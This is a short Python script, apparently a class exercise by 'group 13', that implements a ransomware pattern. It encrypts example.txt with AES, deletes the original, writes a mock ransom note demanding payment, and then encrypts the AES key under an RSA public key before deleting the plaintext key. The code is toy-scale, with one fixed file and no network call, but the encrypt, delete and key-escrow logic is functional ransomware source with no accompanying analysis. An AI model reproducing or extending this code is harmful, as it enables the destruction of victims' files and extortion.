from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes 
from Crypto.PublicKey import RSA
import os

key = get_random_bytes(16)
key_file = open("example.key", "wb")
key_file.write(key)
key_file.close()

before_encryption = open("example.txt", "rb")
iv = get_random_bytes(16)
data = before_encryption.read()
before_encryption.close()
os.remove("example.txt")

cipher = AES.new(key, AES.MODE_CBC, iv)
ciphered_data = cipher.encrypt(pad((data), AES.block_size))

encrypted = open("example.txt.encrypted", "wb")
encrypted.write(cipher.iv)
encrypted.write(ciphered_data)
encrypted.close()

note = open("example.txt.note", "wb")
note.write(b"yOu OwE gRoUp 13 FoUr HuNdReD tRiLlIoN dOlLaRs If YoU wAnT yOuR fIlE bAcK!!!\n")
note.write(b"GiVe Us example.key.encrypted So ThAt We CaN dEcRyPt YoUr PrEcIoUs FiLe.\n")
note.close()

key_file = open("example.key", "rb")
key_data = key_file.read()
key_file.close()
os.remove("example.key")

public_key = RSA.import_key(open("public_key.pem").read())
session_key = get_random_bytes(16)
cipher_rsa = PKCS1_OAEP.new(public_key)
enc_session_key = cipher_rsa.encrypt(session_key)
cipher_aes = AES.new(session_key, AES.MODE_EAX)
ciphertext, tag = cipher_aes.encrypt_and_digest(key_data)
encrypted_keyfile = open("example.key.encrypted", "wb")
[encrypted_keyfile.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
encrypted_keyfile.close()